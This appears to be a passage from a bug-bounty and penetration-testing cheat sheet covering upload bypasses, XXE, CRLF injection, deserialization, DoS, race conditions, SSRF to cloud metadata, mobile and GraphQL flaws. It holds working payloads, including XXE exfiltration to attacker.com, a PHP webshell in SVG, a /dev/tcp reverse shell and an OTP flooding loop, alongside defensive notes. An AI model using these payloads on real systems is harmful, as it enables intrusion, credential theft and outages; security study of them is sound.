- PNG zTXt bomb (50MB zeros → 49KB compressed)
- GIF 40K frames / extreme dimensions OOM

# Dangerous File Types
- SVG: JavaScript, external entities, SSRF via xlink:href
- PDF: embedded JavaScript, action handlers
- DOCX: macro-enabled, CVE-2022-30190 (Follina)
- MP4: nginx mp4 module buffer overread
- GIF: extreme dimensions cause DoS
- Any file with XSS in filename
```

#### 🔓 File Upload Testing Methodology (Tip #18)

```bash
# Testing a file upload? Don't stop after uploading .jpg
# Also check if the application validates:

1. File extension
   - Try: .php, .php5, .phtml, .php.jpg, .php%00.jpg
   - Try: .asp, .aspx, .jsp, .jspx, .cgi, .pl
   - Try: .svg, .html, .htm, .shtml
   - Try: double extensions: shell.php.jpg

2. MIME-Type (Content-Type header)
   - Send: Content-Type: image/jpeg with .php file
   - Send: Content-Type: application/x-php with .jpg extension
   - Send: No Content-Type at all
   - Send: Multiple Content-Type headers

3. Magic Bytes (file signature)
   - Prepend GIF89a; before PHP code
   - Prepend PNG header (\x89PNG\r\n\x1a\n) before payload
   - Prepend JPEG header (\xFF\xD8\xFF) before payload
   - Use valid image with appended code

4. File content after processing
   - Does the server resize/re-encode? (may strip payload)
   - Does the server rename the file? (may strip extension)
   - Does the server store in a non-executable directory?
   - Can you access the uploaded file directly?

# A secure upload validates MULTIPLE LAYERS - not just what the browser sends.
# Test only on systems you have permission to assess.
```

#### 🔓 File Upload Bypass via Null Byte Truncation (Tip #51)

```bash
# The server only allows .jpg, but you upload:
evil.php%00.jpg
# Older PHP versions (< 5.3.4) may truncate at %00,
# saving the file as evil.php → RCE

# Also try:
evil.php\x00.jpg
evil.php%00.png
evil.php%00.gif

# Modern variants:
evil.php.jpg.php
evil.php.jpg%00
evil.pHp (case variation)
evil.php5
evil.phar

# Note: This is mostly relevant for older PHP versions,
# but still worth testing on legacy applications.
```

#### 🔓 File Upload Bypass → Remote Code Execution (Tip #37)

```bash
# POC:
# 1. Upload feature allowed only image files
# 2. Renamed PHP shell as shell.php.jpg
# 3. Server accepted file without content validation
# 4. Executed uploaded payload from public URL

# Also try:
# - shell.php.jpg (double extension)
# - shell.jpg.php (reversed)
# - shell.pHp (case variation)
# - shell.php%00.jpg (null byte)
# - .htaccess upload to change execution rules
# - SVG with embedded PHP: <svg><?php system($_GET['c']); ?></svg>

# Learning:
# - Validate file content server-side (not just extension/MIME)
# - Never execute uploaded files (store outside webroot)
# - Use random filenames, strip all extensions
# - Implement Content-Disposition: attachment for downloads
```

### XML External Entity (XXE)

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Blind XXE with external DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/payload.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- payload.dtd: -->
<!ENTITY send "<!ENTITY xxe SYSTEM 'http://attacker.com/?data=%file;'>">

<!-- SVG XXE -->
<image xlink:href="http://internal/resource" />

<!-- XInclude -->
<xi:include href="file:///C:/Windows/system32/drivers/etc/hosts" parse="text"/>
```

#### 🔓 XXE to AWS Key Leak (Tip #80)

```xml
<!-- Technique: Blind XXE using out-of-band (OOB) channels
     to exfiltrate cloud metadata. -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>

<!-- For blind XXE (no direct output), use OOB exfiltration: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<foo>bar</foo>

<!-- evil.dtd on attacker server: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%data;'>">
%all;

<!-- Use a personal VPS as the DNS/HTTP callback -->
<!-- Philosophy: File uploads and XML parsers are prime targets.
     OOB exfiltration turns blind vulnerabilities into critical cloud takeovers. -->

<!-- Where to inject XXE: -->
<!-- - SVG file uploads -->
<!-- - DOCX/XLSX/PPTX (Office Open XML) -->
<!-- - SOAP/XML API endpoints -->
<!-- - SAML responses -->
<!-- - RSS/Atom feed imports -->
<!-- - Configuration file uploads -->
```

### CRLF Injection / HTTP Response Splitting

```bash
# Injection Points
- URL parameters reflected in headers: redirect_uri, next
- Host header injection
- Filename parameters: %0D%0A.js extension bypass
- User-Agent in logging contexts
- Cloudflare concat() with \x0a\x0d hex escapes
- undici host header (missed CRLF validation)
- Pitchfork append_header with Rack 3

# Payloads
%0d%0a (CRLF URL-encoded)
%0d (bare CR — Node.js llhttp treats as delimiter)
Unicode newlines: %E5%98%8A%E5%98%8D
\x0a\x0d (hex escapes in Cloudflare rules)

# Impact
- Set arbitrary cookies (session fixation)
- Inject headers (HSTS bypass, CSP bypass)
- XSS via data URI in Location header
- Cache poisoning
- HTTP request smuggling
```

#### 🔓 CRLF Injection → Cookie Manipulation (Tip #31)

```bash
# POC:
# 1. Found user input reflected in response header
# 2. Injected %0d%0aSet-Cookie: payload
# 3. Server added attacker-controlled cookie
# 4. Session behavior was manipulated

# Example:
GET /redirect?url=http://example.com%0d%0aSet-Cookie:admin=true%0d%0a HTTP/1.1

# Response:
HTTP/1.1 302 Found
Location: http://example.com
Set-Cookie: admin=true

# Also test:
# - Injecting X-Frame-Options: ALLOWALL (clickjacking)
# - Injecting Content-Security-Policy: unsafe-inline (XSS)
# - Injecting Access-Control-Allow-Origin: * (CORS)
# - Double CRLF for full response body injection (XSS)

# Learning:
# - Sanitize CRLF characters in headers
# - Never trust user input in HTTP responses
# - Use allowlists for header values
```

#### 🔓 CRLF Injection → Response Header Injection (Tip #38)

```bash
# POC:
# 1. Found user input reflected in response header
# 2. Injected %0d%0a characters in parameter
# 3. Added malicious custom response header
# 4. Browser processed injected header successfully

# Testing methodology:
# 1. Find parameters reflected in response headers (Location, X-Custom, etc.)
# 2. Inject: %0d%0aX-Injected:true
# 3. Check if the new header appears in the response
# 4. Escalate: %0d%0a%0d%0a<script>alert(1)</script> (full body injection)

# Learning:
# - Sanitize newline characters in headers
# - Never trust user input in HTTP responses
# - Validate against CRLF in all user-supplied values that reach headers
```

---

## 8. DESERIALIZATION & PARSER BUGS

### Java Deserialization

```bash
# SnakeYAML (without SafeConstructor)
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil/"]]]]

# WebLogic /wls-wsat/CoordinatorPortType
SOAP XML with XMLDecoder → ProcessBuilder → OS commands

# Kafka Connect SASL JAAS
JndiLoginModule → LDAP → deserialization gadget chain
```

### Ruby Deserialization

```bash
# Marshal.load via ActiveSupport::MessageVerifier
# GitHub import: Sawyer::Resource → Redis injection → Marshal.load RCE
{"default_branch":{"to_s":{"to_s":"ggg\r\nINJECT_RESP_HERE","bytesize":3}}}

# YAML.load without SafeConstructor
# RDoc .rdoc_options → arbitrary object instantiation → RCE
```

### PHP Deserialization

```bash
# unserialize() without class restrictions
unserialize($request['body']['plugins'])

# PHAR metadata
phar:// protocol for file operations → unserialize trigger

# YAML !php/object
a: !php/object O:0:1  → double free / arbitrary class instantiation

# WDDX
wddx_deserialize → null deref, UAF, OOB read, heap corruption
```

### Python Deserialization

```bash
# pickle.loads() with malicious pickle
# PyYAML.load() without SafeLoader
# chain.__setstate__ type confusion
# LZMADecompressor.decompress UAF (dangling pointer after error)
# FutureIter_throw type confusion → arbitrary code execution
# AST builder OOB reads
```

### Node.js / HTTP Parser Bugs

```bash
# llhttp bare CR smuggling (\r as delimiter)
# Multi-line Transfer-Encoding
# Chunk extension unbounded read → DoS
# HTTP/2 CONTINUATION flood → OOM
# Abrupt TCP close during header processing → assertion crash
```

### HTTP/3 QUIC Bugs

```bash
# OOB write via encoder instructions
# Stack buffer overflow during connection draining
# NULL pointer dereference
# Memory leak with MTU >= 4096
```

### TLS / Cryptographic Bugs

```bash
# Session ticket cross-vhost bypass (nginx + OpenSSL)
# SSLv3 POODLE on SMTP/MX servers
# Marvin timing attack on RSA (CVE-2022-4304)
# mbedTLS IP address hostname skip
# wolfSSL QUIC error path cert bypass
# HSTS multi-URL/parallel amnesia (curl)
# GCM IV reuse when set before key (Ruby OpenSSL)
```

### curl Connection Reuse Bugs

```bash
# Missing SSH/GSS/FTP/TLS options in pool key
# IPv6 zone ID not compared
# Same-host different-port credential leak
# HTTP→FTP cross-protocol credential leak
# .netrc + redirect credential leak
```

### mruby / Ruby VM Bugs (Fuzzing Targets)

```bash
# OP_RESCUE UAF, OP_R_BREAK OOB
# ary_concat null deref
# mrb_ary_splice integer overflow
# str_substr overflow
# sprintf underflow
# codegen bugs (negation, redo in rescue)
# Struct type confusion → RCE
# Range constructor type confusion
# GC mark_context_stack null deref
```

---

## 9. DoS & RESOURCE EXHAUSTION

### ReDoS Payloads

```bash
".;" * 520000                    # Django urlize (CVE-2024-41990)
"&" + ";:" * 520000              # Django urlize variant (CVE-2024-45230)
"1e1000000"                      # Django floatformat (CVE-2024-41989)
"¾" * 1_000_000                  # Django NFKC normalization Windows
"![l" * 100000                   # cmark-gfm autolink / GitLab
(?:){4294967295}                 # Rust regex empty subexpr
#0...(50000)c0ffee               # color validator
Range: bytes=0-18446744073709551615   # Rack
Accept-Encoding: <crafted>       # Rack
```

### Resource Exhaustion

```bash
- Multi-megabyte passwords before validation (fail-fast violation)
- 5000-char emails → server hang 20s → 503
- Multipart unlimited parts → FD exhaustion
- Set-Cookie flood → 1MB cookie limit errors
- Chained compression malloc bomb (gzip, brotli, zstd repeated)
- XML nested namespaces REXML → exponential CPU
- TLS session cache zero-length ID → unbounded growth
- UDP RLP length=-5 → infinite loop (RSKJ)
- Peer discovery map growth → JVM OOM
- GraphQL mutation aliasing ×100 → 8s per alias
- Slow HTTP body / idle timeout 0 → connection exhaustion
- Pixel flood 64K×64K → memory allocation DoS
- PNG zTXt bomb → decompression timeout
- GIF 40K frames → processing freeze
- XMPP compression bomb (4GB whitespace → 4MB zlib)
- Mermaid diagram rendering freeze
- Long filenames → OOM + temp file leak
```

### Algorithmic Complexity

```bash
- Django strip_punctuation O(n²) with many braces
- Rails Action Text blockquote regex backtracking
- GlobalID model name parsing
- Active Support underscore/titleize/tableize
- Rack Content-Disposition / RFC2183 boundary parsing
- rails-html-sanitizer SVG attribute regex
- PHP mbstring / Oniguruma malformed regex → heap corruption
```

### 🔴 API Resource Consumption (OWASP API4 — from API Pentesting Blog)

```bash
# File upload/download is a fundamental feature
# An API is vulnerable if it fails to limit resource-consuming requests
# (network bandwidth, CPU, memory, storage)

# Without effective rate-limiting, users can exploit this and cause financial damage

# If endpoint doesn't validate file size → backend saves files of any size
# Without rate-limiting → repeated uploads exhaust disk storage → DoS + financial loss

# Also test: does endpoint restrict file types beyond expected format?
# (e.g., attempting to upload .exe where only PDFs should be allowed)

# Practical example (SMS OTP flooding):
for i in {1..100}; do
  echo "Request $i"
  curl -s -X POST \
    "http://target/api/v1/authentication/customers/passwords/resets/sms-otps" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d '{"Email":"string"}'
  echo
done
```

---

## 10. BUSINESS LOGIC & RACE CONDITIONS

### Race Condition Testing

```bash
# Turbo Intruder single-packet attack
engine.queue(request, gate='race1')  # x100
engine.openGate('race1')

# GraphQL batching
75 mutations/request × 100 parallel = 6400 ops in ~40s

# Rails array params
token[]=a&token[]=b → SQL IN batching → rate limit bypass
```

#### 🏁 Race Condition Testing Methodology (Tip #9)

```bash
# One request may fail. 100 concurrent requests may succeed.
# Test operations like:
• Coupon redemption
• Wallet transfers
• OTP verification
• Registration
• Purchases
• Token/credit distribution
• Invitation acceptance
• Rate-limited operations

# Many race conditions only appear under concurrency.
# Testing approach:
# 1. Identify the operation
# 2. Send 1 request → observe normal behavior
# 3. Send 50-100 concurrent requests (Turbo Intruder, custom script)
# 4. Check if limits were exceeded, tokens reused, or state corrupted

# Python concurrent request example:
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, data=data) as resp:
        return await resp.text()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        print(results)

asyncio.run(main())
```

#### 🏁 Race Condition → Double Coupon Redemption (Tip #33)

```bash
# POC:
# 1. Applied discount coupon at checkout
# 2. Sent multiple requests simultaneously
# 3. Server validated coupon multiple times
# 4. Same coupon redeemed repeatedly

# Also test:
# - Double-spend wallet balance
# - Multiple account registrations with same invite
# - Parallel password reset token usage
# - Concurrent vote/like operations
# - Simultaneous seat reservations
# - Parallel withdrawal requests

# Learning:
# - Use atomic validation for transactions (database locks)
# - Prevent parallel request abuse (idempotency keys)
# - Use SELECT ... FOR UPDATE in SQL
# - Implement proper mutex/semaphore in application code
```

#### 🏁 Race Condition → Token Reuse (Tip #74)

```python
# Technique: Exploiting timing flaws to reuse single-use tokens
# or apply discounts multiple times.

# Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

# Philosophy: Async operations are vulnerable. If the server doesn't use
# proper database locks, state can be corrupted by parallel requests.
```

### Common Race Scenarios

```bash
- Faucet/token distribution: concurrent requests exceed limits
- Group joining: same user joins multiple times
- Follow/like inflation: concurrent requests bypass checks
- Account creation: unlimited accounts via concurrency
- Payment processing: double-spend or over-credit
- File operations: TOCTOU (time-of-check to time-of-use)
- Email validation: change email during confirmation → TOCTOU
- Subdomain limits: concurrent creation bypasses quota
- Theme publish: race during installation
- Credit transfer: concurrent requests add free credits
```

### Payment & Pricing Flow Bypass

```bash
# Common Patterns
- Parameter tampering: change price to 0.00 (IDR0.00 bypass)
- Currency manipulation
- Status override: "MODERATION" → "ACTIVE"
- Admin approval bypass: PATCH admin_approval="APPROVED"
- Plan upgrade races: skip review queues
- Quantity manipulation: order 25,000 items via URL
- Negative quantities, extreme values
- Coupon code reuse, stacking
- Sides array injection: unlimited extras in JSON
- Double payout via PayPal transaction state confusion
```

### State Machine Bypass

```bash
# Client-supplied status values accepted
- UpdateVacancyStatus: "MODERATION" → "ACTIVE"
- Reddit Ads: admin_approval="APPROVED", effective_status="ACTIVE"
- Shopify: bypass email verification in invitation flow
- captain:true for all players (Sorare GraphQL)
- showAds:false without premium (Pixiv API)
- enableAuthorize:false skips confirmation (MetaMask Snap)
- nullcast_flag removal → real tweet instead of promoted
```

### Workflow Skip Patterns

```bash
- Clone instead of create (bypasses creation restriction)
- Restore old versions (bypasses read-only)
- Copy locked folders (bypasses lock)
- Reshare permission escalation
- File transformations make private files public
- Invitation → admin escalation without email verify
- Self-testimonial via sandbox
- security@ forwarding loop → private program invites
```

### Feature Gating Bypass

```bash
- Direct API for premium features (showAds:false)
- UI-only paywall (Slack screenhero rooms.create)
- Beta flag manipulation (GraphQL response)
- Mobile vs web rate limits differ
- GovSlack API accessible with slack.com cookies
- Test token generation without admin role
```

### 🔴 Unrestricted Access to Sensitive Business Flows (OWASP API6 — from API Pentesting Blog)

```bash
# If a web API exposes operations or data that let users abuse the system
# e.g., buying goods at a discounted price → vulnerable

# Practical example:
curl -X 'GET' \
  'http://target/api/v1/customers/billing-addresses' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <TOKEN>' | jq .
```

---

## 11. INFRASTRUCTURE & CLOUD

### Subdomain Takeover

```bash
# Detection
- CNAME pointing to unclaimed service
- 404/Domain Not Claimed responses
- Heroku: "No such app"
- GitHub Pages: 404
- AWS S3: NoSuchBucket
- Azure: "404 Web App not found"
- Fastly: "Fastly error: unknown domain"
- Squarespace: "Domain Not Claimed"
- UserVoice: "Your UserVoice page is no longer available"

# Exploitation
- Register the service (Fastly, Heroku, etc.)
- Claim the domain
- Serve malicious content
- Steal cookies via CORS misconfiguration
- Phishing from trusted domain
- CSP bypass if domain is whitelisted

# Prevention
- Remove DNS records before deprovisioning
- Monitor CNAME records regularly
- Use CAA records to prevent unauthorized SSL certs
```

### Cache Poisoning

```bash
# Techniques
- Path normalization differences: \ vs / (Shopify CDN)
- Double slash: // treated differently
- Path traversal: /static/../evil.js (Amazon affiliate)
- Query parameter confusion: ? vs &
- Host header injection (X-Forwarded-Host)
- X-Forwarded-Port → redirect to invalid port
- CRLF in cache key components
- Query string sorting reorder (duplicate url parameters)
- Backslash normalization → 404 poison

# Impact
- DoS: poison cache to serve 404s for legitimate URLs
- XSS: poison cache to serve malicious JS (stored DOM XSS)
- Data leakage: cache contains private data
- Session hijacking: cache contains Set-Cookie
```

#### 🔓 Cache Poisoning via Response Headers (Tip #14)

```bash
# Response contains: Cache-Control: public
# Now inspect whether headers like:
# - X-Forwarded-Host
# - X-Host
# - X-Original-URL
# influence the cached response.

# If untrusted input reaches a shared cache,
# you may have discovered a cache poisoning issue.

# Testing:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# Check if response contains evil.com in links/scripts
# If yes, and Cache-Control: public → cache poisoning

# Remember: Cacheable ≠ Vulnerable
# You need: untrusted input → reflected in cached response → served to other users
```

#### 🔓 Host Header Injection → Cache Poisoning (Tip #29)

```bash
# POC:
# 1. Modified Host header in request
# 2. Application reflected malicious host in response
# 3. CDN cached poisoned response
# 4. Other users received attacker-controlled content

# Example:
curl -H "Host: evil.com" https://target.com/page
# If response contains: <script src="https://evil.com/app.js">
# And the response is cached → all users get evil.com's JS

# Learning:
# - Validate Host headers strictly (allowlist)
# - Prevent caching of dynamic responses
# - Don't use Host header to construct absolute URLs
# - Use X-Forwarded-Host only from trusted proxies
```

#### 🔓 Web Cache Poisoning → User Data Exposure (Tip #40)

```bash
# POC:
# 1. Injected malicious header into cached request
# 2. CDN stored poisoned response
# 3. Other users received manipulated cached page
# 4. Sensitive user data became exposed

# Learning:
# - Never cache user-specific responses
# - Validate proxy/CDN headers strictly
# - Use Vary header correctly
# - Ensure Cache-Control: private for authenticated content
```

#### 🔓 Web Cache Deception → Account Data Leak (Tip #26)

```bash
# POC:
# 1. Visited authenticated profile page
# 2. Added fake extension .css to URL
#    https://target.com/account/settings.css
# 3. CDN cached the authenticated response (thinks it's static CSS)
# 4. Cached page became accessible without login

# Also try extensions:
# .js, .css, .png, .jpg, .gif, .ico, .svg, .woff, .ttf

# URL patterns:
https://target.com/account/settings;x.css
https://target.com/account/settings%0a.css
https://target.com/account/settings/.css
https://target.com/account/settings..;/style.css

# Learning:
# - Never cache authenticated content
# - Use proper cache-control headers (Cache-Control: no-store)
# - CDN should not cache based on extension alone
# - Validate that the response Content-Type matches the extension
```

#### 🔓 Cloud VM Takeover via SSRF (Tip #68)

```bash
# Technique: SSRF accessing cloud metadata to steal IAM credentials.
# Payloads:

# AWS:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# GCP (add header):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: X-Google-Metadata-Request: True
# OR use v1beta1 (no header needed):
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token

# Azure:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true

# Philosophy: Cloud environments rely on metadata; stealing service account
# tokens leads to full infrastructure takeover.

# After getting credentials:
# AWS: aws sts get-caller-identity → aws s3 ls → aws ec2 describe-instances
# GCP: gcloud auth activate-service-account --key-file=key.json
# Azure: az login --identity
```

#### 🔓 Internal Jenkins RCE via SSRF (Tip #70)

```bash
# Technique: SSRF used to reach unauthenticated internal CI/CD pipelines.
# POC:
# 1. Found SSRF endpoint
# 2. Accessed http://internal-jenkins:8080/script via SSRF proxy
# 3. Executed Groovy reverse shell:
#    String cmd = "bash -i >& /dev/tcp/attacker/4444 0>&1";
#    def proc = cmd.execute();
#    proc.waitFor();

# Common internal CI/CD targets:
# - Jenkins: /script (Groovy console)
# - GitLab CI: /admin/runners
# - TeamCity: /admin/admin.html
# - ArgoCD: /settings/clusters
# - Drone CI: /api/repos
# - GoCD: /go/admin

# Philosophy: Map the internal network via SSRF; look for default credentials
# or unauthenticated admin panels on internal services.
```

### Kubernetes & Containers

```bash
# Common Vulnerabilities
- Exposed Docker API (2375) → container escape
- Exposed Kubernetes API → cluster admin (no auth)
- kOps GCP: metadata service → state bucket → CA key → system:masters
- Argo CD: CSRF → Application CRD → cluster compromise
- Ingress-nginx: annotation injection → Lua → RCE
- Ingress path field: log_format + access_log + include → RCE
- Metrics-server hijacking → redirect → Bearer token theft
- Windows storage plugin: SYSTEM command injection
- Pod /etc/hosts writable → host disk fill
- Namespace restriction bypass with sharding
- Eureka/Spring Actuator public → config/credentials leak

# Testing
- kubectl proxy exposed?
- kubelet read-only port (10255)?
- etcd exposed (2379)?
- Dashboard exposed without auth?
- cAdvisor/Prometheus/Grafana public?
```

### S3 / Cloud Storage

```bash
- Public list/read/write buckets
- Signed URL path manipulation: /.? → bucket root
- Upload policy prefix-only enforcement (files/ prefix)
- Path traversal in attachment filename → read other users' files
- iOS test build code exposure
```

### CI/CD Attacks

```bash
- Cache poisoning via re-uploadable artifacts (NX Cloud)
- HTTP dependency MITM (Maven/SBT over HTTP)
- Build log token leak (Travis, TeamCity)
- Worker container escape via symlink artifacts
- postinst setuid backdoor in .deb packages
- Malicious .lgtm.yml symlink → host file read
```

### VPN / Appliances

```bash
- Pulse Secure CVE-2019-11510: path traversal → LMDB passwords → RCE
- Ivanti EPM CSA CVE-2021-44529: cookie base64 PHP RCE
- Exchange autodiscover CVE-2022-41040: SSRF
- F5 BIG-IP cookie: decode internal IP
- Apache mod_rewrite Windows: SSRF → NTLM hash leak
```

---

## 12. MOBILE & DESKTOP

### Android

```bash
# Exported Components
- Exported activities: android:exported="true" + intent data
  file://, javascript://, http:// schemes
- SEND_MULTIPLE intent → file theft from private data dir
- Content providers exported: SQLi via projection/selection
- Content providers exposing password hashes (bcrypt)
- Broadcast receivers: system-wide vs LocalBroadcastManager

# WebView
- JS enabled + arbitrary HTML from intent extras
- No cert pinning → MITM
- file:// and javascript: scheme handling
- CVE-2020-6506 UXSS with setSupportMultipleWindows=false

# Deeplinks
- Bypass biometrics/PIN via deeplink to admin page
- CSRF via pscp://user/<id>/follow
- OAuth code interception without PKCE (shopapp://)
- Zomato deeplink: zomatodelivery://zloyaltywebview/?url=attacker

# APK Recon
- Hardcoded keys/secrets via decompilation (jadx, apktool)
- Insecure local data storage (SQLite plaintext)
- ZIP slip on extraction
- Path filter bypass: /data/user/0/ symlink for /data/data/
- App lock bypass via rapid activity switching
- PlayerProxy port exposed → remote data access
```

### iOS

```bash
- PIN brute force: unlimited attempts (10,000 combinations)
- WARP Lock bypass: profile deletion / airplane mode / trusted-ssid
- WebView unsanitized stored XSS
- URL scheme hijacking: custom schemes for OAuth
- Clipboard leakage between apps
- Keyboard cache leaks sensitive input
- NUL byte in DM reaction_key → app crash
```

### Desktop Clients

```bash
# Electron/CEF
- Chrome remote debugging port → RCE (Burp)
- ASAR integrity bypass via filetype confusion (macOS)
- Node.js integration enabled → full system access
- Context isolation disabled → renderer compromise
- Steam Deck: CEF V8 exploit → root RCE

# Nextcloud Desktop
- E2EE certificate validation bypass
- Code injection via crafted files (macOS CVE-2024-37885)
- Auto-attach credentials to arbitrary directDownloadUrl
- Path traversal in file operations
- Mail auto-configurator credential leak

# General
- DLL hijacking: tcmalloc.dll in PATH (C:\Python27, WindowsApps)
- Symlink attacks in quarantine/restore
- Log file symlink privilege escalation (chmod 666)
- Crash reporter DLL hijacking (ubsec.dll)
- OpenSSL config path hardcoded writable
- macOS XPC version not checked
- PATH hijack: /tmp/ifconfig reverse shell
- Protocol handlers: steam:// overwrites arbitrary files
```

### Kernel / Console

```bash
- PS5 sys_fsc2h_ctrl: stack UAF via 4-thread race
- PS5 double fdrop: fd reuse → UAF
- PS4 BD-J: nested JAR path confusion → AllPermission
- FreeBSD IPV6_2292PKTOPTIONS: UAF → kernel R/W
- Nintendo Switch PIA: stack buffer overflow in room info deser
- Xen HVM VGA: deadlock via lock re-acquisition
```

---

## 13. GRAPHQL & API SPECIFICS

### API Architectural Styles Overview (from API Pentesting Blog)

```bash
# === REST API ===
# According to IBM: conforms to REST (Representational State Transfer) design principles
# REST is a set of design principles, not a strict protocol
# Sometimes called RESTful APIs or RESTful web APIs

# Rule: Use the appropriate HTTP verb
# Good implementation:
GET /users          # retrieve all users
GET /users/<id>     # retrieve a particular user
POST /users         # create a new user
DELETE /users/<id>  # delete a specific user
PATCH /users/<id>   # update a user

# Bad implementation:
GET /getuser
POST /user/create
PUT /user/update
DELETE /user/delete/<id>

# Uniform Interface:
# All API requests for same resource should look the same
# Same piece of data belongs to only one URI
# Resources shouldn't be too large but should contain every piece of info client needs

# Statelessness:
# Each request must include all information necessary for processing
# No server-side sessions — server doesn't store client request data

# REST APIs mostly work with JSON

# Problem with REST: OVERFETCHING
GET /users/me
# Fetches ALL defined info even if you only wanted id or title
# Wastes network bandwidth

# Problem with REST: MULTIPLE ROUND TRIPS
GET /users/me
GET /users/info
# Two separate calls for related data

# === GraphQL ===
# Solves overfetching: query only what you need
query Products {
  id
  title
  name
}
# Returns only that data, nothing extra

# Solves multiple round trips: single query for nested data
query Products {
  id
  title
  name
  info {
    name
  }
}

# Key characteristics:
# - Always uses POST verb (REST enforces verb-per-action)
# - Single endpoint (typically /graphql) vs multiple REST endpoints
# - Queries fetch data, Mutations modify data
# - No PATCH, PUT, DELETE — mutations handle everything including deletes
# - Created by Facebook, used by Twitter
# - Philosophy: describe your data, ask for what you want, get predictable results

# To fetch data:
query Product {
  __schema
}

# To create/update data:
mutation Product(id=1) { ...data }

# To delete:
mutation DeleteProduct(id=1)

# === RPC (gRPC) ===
# Remote Procedure Call — "procedure" = function
# Lets client call a function stored/executed on remote server
# Does NOT use JSON
# Common implementation: gRPC uses Protocol Buffers (Protobuf)
# Define functions and return types in .proto file
# Client automatically loads type definition

# === SOAP (Simple Object Access Protocol) ===
# Messaging protocol characteristics:
# - Strictly uses XML data format (due to complexity)
# - Mostly used for complex systems with strict standards (security, reliability)
# - Relies on SSL and WS-Security for secure communication
# - Manages records and maintains state between requests

# SOAP message structure (ordinary XML document):
# - Envelope element: identifies XML as SOAP message
# - Header element: contains header information
# - Body element: contains call and response information
# - Fault element: contains errors and status information
# All declared in default namespace for SOAP envelope

# Syntax rules:
# - MUST be encoded using XML
# - MUST use SOAP Envelope namespace
# - Must NOT contain DTD reference
# - Must NOT contain XML processing instructions
# More info: W3Schools > SOAP
```

### GraphQL Vulnerabilities

```bash
# IDOR via Node Queries
node(id: "gid://hackerone/PolicyPageAssetGroup/3981-41287")
- Sequential IDs enumerable
- No authorization check on node resolver
- Global IDs leak internal type names

# Mutation Authorization Bypass
- Check authorization on primary ID only
- Secondary IDs (swag_id, pixel_event_id) not checked
- Polymorphic associations (noteable_id) not scoped
- Response data leaks before acceptance (SaveCollaboratorsMutation)

# Batching Attacks
- Named query batching: 75 mutations per request
- Alias batching: 100+ aliases for DoS (~8s per alias)
- Combine with single-packet race attack
- Bypass rate limits via batching

# Introspection Abuse
- Discover hidden types, mutations, fields
- Find deprecated APIs (often lack auth checks)
- Map object relationships for IDOR
- slack_pipelines connection → private channel names

# Field-Level Auth Missing
- marketingActivities → budget data
- publications → app apiKey
- report_sources → private program existence
- vpn_suspended → program membership oracle
- industry field → private program detection
- private_comment on SurveyRatingItem

# sort_query Raw JSON → Painless RCE
[{"_script":{"type":"number","script":{"source":"...","lang":"painless"}}}]

# Testing Strategy
- Introspect all queries and mutations
- Test every ID parameter with other users' IDs
- Test batching with alias limits
- Test error messages for enumeration (not found vs unauthorized)
- Check if response data is scoped to permissions
- Test GET requests (CSRF via GraphQL)
```

### 🔍 GraphQL Recon Tip (Tip #12)

```bash
# Introspection disabled? Don't stop.
# Look for:
/graphql
/graphql/v1
/graphql/v2
/api/graphql
/graphiql
/playground
/altair
/voyager
/graphql/console

# Also inspect JavaScript files for hidden GraphQL endpoints:
grep -r "graphql" js/ | grep -i "url\|endpoint\|fetch\|axios"

# Many applications disable introspection but still expose useful operations.
# Even without introspection:
# - Test common query names: user, users, admin, me, profile
# - Look for __typename in responses (confirms GraphQL)
# - Try field suggestions (error messages often reveal valid fields)
# - Check for persisted queries (sha256 hashes in JS files)
# - Test batching even if single queries work
```

### 🔍 GraphQL Batch Query Abuse → Data Extraction (Tip #23)

```bash
# POC:
# 1. Found GraphQL endpoint with batching enabled
# 2. Combined hundreds of queries into a single request
# 3. Bypassed intended rate limits
# 4. Extracted large amounts of user data rapidly

# Example batch query:
[
  {"query": "{ user(id: 1) { email name } }"},
  {"query": "{ user(id: 2) { email name } }"},
  {"query": "{ user(id: 3) { email name } }"},
  ...
  {"query": "{ user(id: 1000) { email name } }"}
]

# Learning:
# - Limit batch query size (max 5-10 operations per request)
# - Apply rate limits per OPERATION, not per request
# - Monitor for unusual query patterns
# - Disable batching in production if not needed
```

### 🔍 GraphQL Introspection → Hidden API Discovery (Tip #32)

```bash
# POC:
# 1. Found public GraphQL endpoint
# 2. Sent introspection query to API
# 3. Retrieved hidden schema and endpoints
# 4. Discovered internal admin operations

# Introspection query:
{"query": "{ __schema { types { name fields { name type { name } } } } }"}

# Also try:
{"query": "{ __schema { mutationType { fields { name } } } }"}
{"query": "{ __schema { queryType { fields { name } } } }"}
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Learning:
